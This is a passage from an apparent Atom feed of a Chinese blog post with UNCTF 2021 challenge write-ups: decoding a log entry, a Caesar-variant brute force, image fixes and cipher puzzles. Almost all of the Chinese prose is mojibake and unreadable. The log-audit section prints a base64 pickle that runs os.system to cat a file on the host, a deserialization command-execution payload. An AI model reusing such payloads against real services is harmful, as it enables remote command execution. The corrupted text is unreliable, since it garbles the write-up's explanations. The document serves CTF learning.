href="#ç®€å•æ—¥å¿—å®¡è®¡" class="headerlink" title="ç®€å•æ—¥å¿—å®¡è®¡"></a>ç®€å•æ—¥å¿—å®¡è®¡</h3><blockquote><p>ç›¸ä¼ ï¼Œåœ¨æŸä¸€å½’éšé—¨æ´¾çš„æœåŠ¡å™¨é‡Œå­˜åœ¨ç€ä¼—å¤šç›–ä¸–ç»å­¦ï¼Œè°æŒæ¡äº†ä»»ä¸€ä¸€æœ¬ç»å­¦è°å°±èƒ½ä¸€ç»ŸCTFæ±Ÿæ¹–ï¼Œçªç„¶æœ‰ä¸€å¤©é—¨æ´¾çš„é•¿è€å‘ç°æœåŠ¡å™¨çš„æ—¥å¿—é‡Œå­˜åœ¨ç€äº›è®¸å¼‚å¸¸ï¼Œæˆ–è®¸è¿™é—¨ç»å­¦å·²ç»å¤±çªƒäº†ï¼Œè¯·å¸®å¸®é•¿è€æ‰¾å‡ºå¤±çªƒçš„æ˜¯å“ªä¸€æœ¬ç»å­¦å§ã€‚flagæ ¼å¼ä¸ºUNCTF{*}</p></blockquote><p>æ—¥å¿—æ–‡ä»¶é‡Œæ‰¾åˆ°base64ç¼–ç å­—ç¬¦ä¸² <code>STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu</code>ï¼Œ</p><p>è§£ç å¾—pickleï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /CTF?YouShouJiuXing&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>flagï¼š<code>UNCTF&#123;CTF?YouShouJiuXing&#125;</code></p><p>â€‹    </p><h3 id="ç”µä¿¡è¯ˆéª—"><a href="#ç”µä¿¡è¯ˆéª—" class="headerlink" title="ç”µä¿¡è¯ˆéª—"></a>ç”µä¿¡è¯ˆéª—</h3><blockquote><p>CTFer,ä½ å¥½ï¼Œæˆ‘æ˜¯å¨éœ‡å¤©ï¼å…¶å®æˆ‘åœ¨èŠåŠ å“¥å¤§æˆ˜ä¸­æ²¡æ­»ï¼Œç°åœ¨ä½ åªéœ€è¦æ‰“2000RMBåˆ°æˆ‘çš„é“¶è¡Œè´¦æˆ·ï¼Œæˆ‘å°±å¯ä»¥ç”¨è¿™2000RMBå‘çº¢åŒ…éª—å–äººä»¬çš„ä¿¡ä»»ï¼Œç„¶åç©¿è¿‡è‚¡å¸‚ç½‘ç»œæ‰¾åˆ°éœ‡è¡æ³¢åœ¨çº½çº¦ç»™æˆ‘æ‰¾çš„æ–°èº«ä½“ï¼Œç„¶åæˆ‘å°±å¯ä»¥å¤æ´»äº†ã€‚ä»Šå¤©å¦‚æœä½ å¸®äº†æˆ‘ï¼Œå¤æ´»åæˆ‘å¯ä»¥å…¥ä¾µè‚¡å¸‚ç½‘ç»œæŠŠé’±å…¨éƒ¨ç»™ä½ ä»¬ã€‚ç­‰è¿‡äº†å‘¨æœ«ï¼Œæˆ‘å°±è®©çº¢èœ˜è››å˜æˆé£æœºå»æ¥ä½ ï¼Œç„¶åæˆ‘æŠŠçº¢èœ˜è››æ€äº†ï¼Œè®©ä½ å½“éœ¸å¤©è™å‰¯æŒ‡æŒ¥å®˜ï¼Œç„¶åæˆ‘ä»¬ä»å—ææ´²å‘ˆæ‰©æ•£å¼å‘å‡ºéœ¸å¤©è™å†›é˜Ÿï¼Œä¸‡å†›é½å‘ï¼Œå é¢†åœ°çƒï¼Œæ€ä¹ˆæ ·ï¼Ÿä¸ºäº†é˜²æ­¢è¿™æ¡æ¶ˆæ¯è¢«æ“å¤©æŸ±æ‹¦æˆªã€‚æˆ‘å°†é“¶è¡Œå¡å·è¿›è¡Œäº†åŠ å¯†ï¼Œå¸Œæœ›ä½ èƒ½æˆåŠŸè§£å¯†ã€‚æˆ‘çš„é“¶è¡Œè´¦æˆ·æ˜¯ <code>qi]m^roVibdVbXUU`h</code> </p><p>flagæ ¼å¼ï¼šunctf{}</p></blockquote><p>å˜å¼‚å‡¯æ’’åŠ å¯†ï¼Œè„šæœ¬çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;qi]m^roVibdVbXUU`h&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i+j &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i+j&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i+j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;yauoreright&#125;</code></p><p>â€‹    </p><h3 id="å¼•å¤§æµå’¯ï¼Œhappy"><a href="#å¼•å¤§æµå’¯ï¼Œhappy" class="headerlink" title="å¼•å¤§æµå’¯ï¼Œhappy"></a>å¼•å¤§æµå’¯ï¼Œhappy</h3><blockquote><p>è™šæ©çš„å¤§é—¨åæ˜¯ä¸€å‰¯æ®‹ç¼ºçš„ç”»å·ã€‚</p></blockquote><p>ä¿®æ”¹jpgé«˜åº¦å‘ç°flagã€‚</p><p>flagï¼š<code>UNCTF&#123;BellalaBella&#125;</code></p><p>â€‹    </p><h3 id="å€’ç«‹æ´—å¤´"><a href="#å€’ç«‹æ´—å¤´" class="headerlink" title="å€’ç«‹æ´—å¤´"></a>å€’ç«‹æ´—å¤´</h3><p>è§‚å¯Ÿæ–‡ä»¶å­—ç¬¦ä¸²å¤´å°¾åˆ†åˆ«æ˜¯ <code>d9ff</code> å’Œ <code>ffd8</code>ï¼Œè„šæœ¬é€†åºå¤„ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytes</span>.fromhex(f)[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>æŠŠæ–‡ä»¶å¤´ <code>D8FF</code> ä¿®æ­£ä¸º <code>FFD8</code>ï¼Œå›¾ç‰‡æ²¡ä»€ä¹ˆå¼‚å¸¸ï¼Œåœ¨ä¸­é—´å‘ç°å­—ç¬¦ä¸²ï¼š</p><p><code>5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg==</code></p><p>è§£ç ï¼š</p><p><code>ä½›æ—¥ï¼šä¸Šä¿±æ•…ã€‚é å¤§å¯†éš¸æ€¯é™¤å¤šçš¤å­•è€¨çˆæ¢µåœ°è«³è–©ä¾„ç©¶ç¼½è€è«³ä¸æƒ³çš¤è€…æ»…ç½°è¼¸ç¼½é˜¿ä¾„æ»…æ¢µå¤¢ä¾„ä¸å†¥å‰çœŸæ¢µæ²™ç¼½åº¦å³ç¼½éš¸æ€¯æ˜ä¾„åˆ‡ä¾„çŸ¥å‘åœ°å—å‘¼èˆå’’å¥¢ä½›æ¶…å“†å§ªç¥å¯†æ˜å“†é€å®¤åœ°æå†¥å‘¼æ€¯ä½›å–å“†ä¼½éƒ½æ€¯é®è«³å€’ç¼½å¸å†¥å¸è¼¸æ›°è«³éº¼ä¿±æ€–ä¿±è‹¦ä¿±æ³¢</code></p><p>æŠŠ <code>æ—¥</code> æ”¹ä¸º <code>æ›°</code>ï¼Œä½›æ›°è§£å¯†å¾—flagã€‚</p><p>flagï¼š<code>unctf&#123;it_is_easy_right?&#125;</code></p><p>â€‹    </p><h3 id="LPL"><a href="#LPL" class="headerlink" title="LPL"></a>LPL</h3><p>pngå›¾ç‰‡ç”¨010 editoræŸ¥çœ‹ï¼Œç¬¬9-15ä¸ªå—CRCå€¼é”™è¯¯ï¼Œæå–Hexå€¼ <code>4544476e622121</code>ï¼Œè§£Hexå¾— <code>EDGnb!!</code>ã€‚</p><p>ä»¥æ­¤ä¸ºå¯†ç è§£å‹ç¼©åŒ…ï¼Œflag.txt æç¤º <code>https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0</code>ï¼Œä»¥åŠä¸€ä¸ª <code>2021/11/24 14:11</code> çš„æ—¶é—´ï¼Œè®¿é—®Bç«™è§†é¢‘åœ¨è¯„è®ºåŒºæ‰¾åˆ° <code>2021/11/24 14:11</code> çš„è¯„è®ºè§flagã€‚</p><p>flagï¼š<code>flag&#123;LpL_zgbr_rNg_eDg777&#125;</code></p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ä¸ºå“åº”å›½å®¶é€‰æ‹”ã€æ¨èä¼˜ç§€ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ï¼ŒåŸ¹å…»å­¦ç”Ÿçš„åˆ›æ–°æ„è¯†ä¸å›¢é˜Ÿåˆä½œç²¾ç¥ï¼Œæé«˜å¤§å­¦ç”Ÿçš„ç½‘ç»œå®‰å…¨æŠ€æœ¯æ°´å¹³ã€åˆ›æ–°å®è·µä¸ç»¼åˆè®¾è®¡èƒ½åŠ›ï¼Œæ¨åŠ¨æˆ‘å›½é«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå»ºè®¾ä¸æ”¹é©ï¼Œå…¨å›½9æ‰€é«˜æ ¡ï¼ˆé—½å—å¸ˆèŒƒå¤§å­¦ï¼Œç¦å·å¤§å­¦è‡³è¯šå­¦é™¢ï¼Œé‡åº†å¤§å­¦ï¼Œé™†å†›å·¥ç¨‹å¤§å­¦ï¼Œå—äº¬</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
</feed>
